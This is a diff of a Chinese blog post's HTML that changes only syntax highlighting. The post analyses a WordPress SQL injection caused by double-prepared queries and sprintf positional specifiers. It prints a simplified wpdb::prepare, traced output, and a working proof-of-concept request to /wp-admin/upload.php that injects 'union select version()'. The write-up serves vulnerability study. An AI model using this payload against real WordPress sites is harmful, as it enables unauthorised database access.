@@ -76,9 +76,8 @@
   <li>可以使用 <code class="highlighter-rouge">%n$</code> 取到第 n 个参数</li>
 </ul>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>echo sprintf('The %2$s contains %1$d monkeys', 100, "zoo");
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'The %2$s contains %1$d monkeys'</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s2">"zoo"</span><span class="p">);</span>
+</code></pre></div></div>
 
 <p>输出 <code class="highlighter-rouge">The zoo contains 100 monkeys</code></p>
 
@@ -90,9 +89,8 @@
   <p>An optional padding specifier that says what character will be used for padding the results to the right string size. This may be a space character or a 0 (zero character). The default is to pad with spaces. An alternate padding character can be specified by prefixing it with a single quote (‘).</p>
 </blockquote>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>echo sprintf('The %2$s contains %1$\'#10d monkeys', 100, "zoo");
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'The %2$s contains %1$\'#10d monkeys'</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s2">"zoo"</span><span class="p">);</span>
+</code></pre></div></div>
 <p>输出 <code class="highlighter-rouge">The zoo contains #######100 monkeys</code></p>
 
 <h2 id="prepare-函数">prepare 函数</h2>
@@ -101,36 +99,35 @@
 
 <p>下面是一个精简版的</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>class wpdb {
-  function _real_escape( $string ) {
-    return addslashes( $string );
-  }
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">wpdb</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="nf">_real_escape</span><span class="p">(</span> <span class="nv">$string</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$string</span> <span class="p">);</span>
+  <span class="p">}</span>
 
-  public function escape_by_ref( <span class="err">&amp;</span>$string ) {
-    if ( ! is_float( $string ) )
-      $string = $this-&gt;_real_escape( $string );
-  }
+  <span class="k">public</span> <span class="k">function</span> <span class="nf">escape_by_ref</span><span class="p">(</span> <span class="o">&amp;</span><span class="nv">$string</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">is_float</span><span class="p">(</span> <span class="nv">$string</span> <span class="p">)</span> <span class="p">)</span>
+      <span class="nv">$string</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_real_escape</span><span class="p">(</span> <span class="nv">$string</span> <span class="p">);</span>
+  <span class="p">}</span>
 
-  public function prepare( $query, $args ) {
-    $args = func_get_args();
-    array_shift( $args );
-    // If args were passed as an array (as in vsprintf), move them up
-    if ( isset( $args[0] ) <span class="err">&amp;&amp;</span> is_array($args[0]) ) {
-      $args = $args[0];
-    }
-    // in case someone mistakenly already singlequoted it
-    $query = str_replace( "'%s'", '%s', $query ); 
-    // doublequote unquoting
-    $query = str_replace( '"%s"', '%s', $query ); 
-    // quote the strings, avoiding escaped strings like %%s
-    $query = preg_replace( '|(?<span class="err">&lt;</span>!%)%s|', "'%s'", $query );
-    array_walk( $args, array( $this, 'escape_by_ref' ) );
-    var_dump("query: ".$query);
-    return @vsprintf( $query, $args );
-  }
-}
-</code></pre>
-</div>
+  <span class="k">public</span> <span class="k">function</span> <span class="nf">prepare</span><span class="p">(</span> <span class="nv">$query</span><span class="p">,</span> <span class="nv">$args</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$args</span> <span class="o">=</span> <span class="nb">func_get_args</span><span class="p">();</span>
+    <span class="nb">array_shift</span><span class="p">(</span> <span class="nv">$args</span> <span class="p">);</span>
+    <span class="c1">// If args were passed as an array (as in vsprintf), move them up
+</span>    <span class="k">if</span> <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$args</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="c1">// in case someone mistakenly already singlequoted it
+</span>    <span class="nv">$query</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s2">"'%s'"</span><span class="p">,</span> <span class="s1">'%s'</span><span class="p">,</span> <span class="nv">$query</span> <span class="p">);</span> 
+    <span class="c1">// doublequote unquoting
+</span>    <span class="nv">$query</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'"%s"'</span><span class="p">,</span> <span class="s1">'%s'</span><span class="p">,</span> <span class="nv">$query</span> <span class="p">);</span> 
+    <span class="c1">// quote the strings, avoiding escaped strings like %%s
+</span>    <span class="nv">$query</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span> <span class="s1">'|(?&lt;!%)%s|'</span><span class="p">,</span> <span class="s2">"'%s'"</span><span class="p">,</span> <span class="nv">$query</span> <span class="p">);</span>
+    <span class="nb">array_walk</span><span class="p">(</span> <span class="nv">$args</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">'escape_by_ref'</span> <span class="p">)</span> <span class="p">);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="s2">"query: "</span><span class="o">.</span><span class="nv">$query</span><span class="p">);</span>
+    <span class="k">return</span> <span class="o">@</span><span class="nb">vsprintf</span><span class="p">(</span> <span class="nv">$query</span><span class="p">,</span> <span class="nv">$args</span> <span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
 <p>prepare 函数的作用</p>
 
@@ -147,10 +144,9 @@
 
 <p><code class="highlighter-rouge">wp_delete_attachment</code> 中，<code class="highlighter-rouge">$post_id</code> 是用户可以完全控制的参数，来自 <code class="highlighter-rouge">$post_ids = $_REQUEST['media']</code>，然后循环执行下面的逻辑</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>if ( !$post = $wpdb-&gt;get_row( $wpdb-&gt;prepare("SELECT * FROM $wpdb-&gt;posts WHERE ID = %d", $post_id) ) )
-    return $post;
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$post</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_row</span><span class="p">(</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM </span><span class="nv">$wpdb-&gt;posts</span><span class="s2"> WHERE ID = %d"</span><span class="p">,</span> <span class="nv">$post_id</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="nv">$post</span><span class="p">;</span>
+</code></pre></div></div>
 
 <p>这里有第一个检查，但是因为是 <code class="highlighter-rouge">%d</code>，虽然 <code class="highlighter-rouge">$post_id</code> 不是数字，但是如果是数字开头还是可以被转换为了数字的，可以绕过。</p>
 
@@ -160,64 +156,58 @@
 
 <p>这里 <code class="highlighter-rouge">$meta_value</code> 就是上面的 <code class="highlighter-rouge">$post_id</code></p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>$query = $wpdb-&gt;prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );
-if ( !$delete_all )
-  $query .= $wpdb-&gt;prepare(" AND $type_column = %d", $object_id );
-if ( '' !== $meta_value <span class="err">&amp;&amp;</span> null !== $meta_value <span class="err">&amp;&amp;</span> false !== $meta_value )
-  $query .= $wpdb-&gt;prepare(" AND meta_value = %s", $meta_value );
-$meta_ids = $wpdb-&gt;get_col( $query );
-if ( !count( $meta_ids ) )
-  return false;
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span> <span class="s2">"SELECT </span><span class="nv">$id_column</span><span class="s2"> FROM </span><span class="nv">$table</span><span class="s2"> WHERE meta_key = %s"</span><span class="p">,</span> <span class="nv">$meta_key</span> <span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$delete_all</span> <span class="p">)</span>
+  <span class="nv">$query</span> <span class="o">.=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">" AND </span><span class="nv">$type_column</span><span class="s2"> = %d"</span><span class="p">,</span> <span class="nv">$object_id</span> <span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="s1">''</span> <span class="o">!==</span> <span class="nv">$meta_value</span> <span class="o">&amp;&amp;</span> <span class="kc">null</span> <span class="o">!==</span> <span class="nv">$meta_value</span> <span class="o">&amp;&amp;</span> <span class="kc">false</span> <span class="o">!==</span> <span class="nv">$meta_value</span> <span class="p">)</span>
+  <span class="nv">$query</span> <span class="o">.=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">" AND meta_value = %s"</span><span class="p">,</span> <span class="nv">$meta_value</span> <span class="p">);</span>
+<span class="nv">$meta_ids</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_col</span><span class="p">(</span> <span class="nv">$query</span> <span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">count</span><span class="p">(</span> <span class="nv">$meta_ids</span> <span class="p">)</span> <span class="p">)</span>
+  <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</code></pre></div></div>
 
 <p>接下来的流程直接带入 POC 了</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>$obj= new wpdb;
-// 用户可以完全控制的参数
-$meta_value = "%1$%s and PAYLOAD";
-$value_clause = $obj-&gt;prepare(" and meta_value = %s", $meta_value);
-$sql = "select * from table where meta_key=%s $value_clause";
-var_dump($sql);
-// value_clause 被 prepare 了两遍
-var_dump($obj-&gt;prepare($sql, "***"));
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$obj</span><span class="o">=</span> <span class="k">new</span> <span class="nx">wpdb</span><span class="p">;</span>
+<span class="c1">// 用户可以完全控制的参数
+</span><span class="nv">$meta_value</span> <span class="o">=</span> <span class="s2">"%1$%s and PAYLOAD"</span><span class="p">;</span>
+<span class="nv">$value_clause</span> <span class="o">=</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">" and meta_value = %s"</span><span class="p">,</span> <span class="nv">$meta_value</span><span class="p">);</span>
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select * from table where meta_key=%s </span><span class="nv">$value_clause</span><span class="s2">"</span><span class="p">;</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+<span class="c1">// value_clause 被 prepare 了两遍
+</span><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="s2">"***"</span><span class="p">));</span>
+</code></pre></div></div>
 
 <p>的结果是</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>// 将 %s 放入单引号内，准备 sprintf
-string(29) "query:  and meta_value = '%s'"
-// %s 被替换为 %1$%s and PAYLOAD
-string(75) "select * from table where meta_key=%s  and meta_value = '%1$%s and PAYLOAD'"
-// 再次 prepare，%s 被放入单引号内
-string(86) "query: select * from table where meta_key='%s'  and meta_value = '%1$'%s' and PAYLOAD'"
-// 第一个 %s 变成 ***，%1$ 变为 ***，'%s 不需要 padding 就消失了
-string(77) "select * from table where meta_key='***'  and meta_value = '***' and PAYLOAD'"
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 将 %s 放入单引号内，准备 sprintf
+</span><span class="nx">string</span><span class="p">(</span><span class="mi">29</span><span class="p">)</span> <span class="s2">"query:  and meta_value = '%s'"</span>
+<span class="c1">// %s 被替换为 %1$%s and PAYLOAD
+</span><span class="nx">string</span><span class="p">(</span><span class="mi">75</span><span class="p">)</span> <span class="s2">"select * from table where meta_key=%s  and meta_value = '%1$%s and PAYLOAD'"</span>
+<span class="c1">// 再次 prepare，%s 被放入单引号内
+</span><span class="nx">string</span><span class="p">(</span><span class="mi">86</span><span class="p">)</span> <span class="s2">"query: select * from table where meta_key='%s'  and meta_value = '%1$'%s' and PAYLOAD'"</span>
+<span class="c1">// 第一个 %s 变成 ***，%1$ 变为 ***，'%s 不需要 padding 就消失了
+</span><span class="nx">string</span><span class="p">(</span><span class="mi">77</span><span class="p">)</span> <span class="s2">"select * from table where meta_key='***'  and meta_value = '***' and PAYLOAD'"</span>
+</code></pre></div></div>
 
 <p>还可以这样测试下</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>var_dump(sprintf('select * from table where meta_key=\'%s\'  and meta_value = \'5 %1$\'%10s\' and PAYLOAD\'', "***"));
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">var_dump</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">'select * from table where meta_key=\'%s\'  and meta_value = \'5 %1$\'%10s\' and PAYLOAD\''</span><span class="p">,</span> <span class="s2">"***"</span><span class="p">));</span>
+</code></pre></div></div>
 
 <p>的输出是</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>string(86) "select * from table where meta_key='***'  and meta_value = '5 %%%%%%%***' and PAYLOAD'"
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">string</span><span class="p">(</span><span class="mi">86</span><span class="p">)</span> <span class="s2">"select * from table where meta_key='***'  and meta_value = '5 %%%%%%%***' and PAYLOAD'"</span>
+</code></pre></div></div>
 
 <p>POC 是 <code class="highlighter-rouge">/wp-admin/upload.php?_wpnonce=e3280c0238&amp;action=delete&amp;media[]=28 %1$%s union select version() # </code></p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code>string(128) "SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id'  AND meta_value = '28 _thumbnail_id' union select version() # '"
-array(1) {
-  [0]=&gt;
-  string(6) "5.7.19"
-}
-</code></pre>
-</div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">string</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span> <span class="s2">"SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id'  AND meta_value = '28 _thumbnail_id' union select version() # '"</span>
+<span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="nx">string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="s2">"5.7.19"</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
 <h2 id="总结">总结</h2>
 
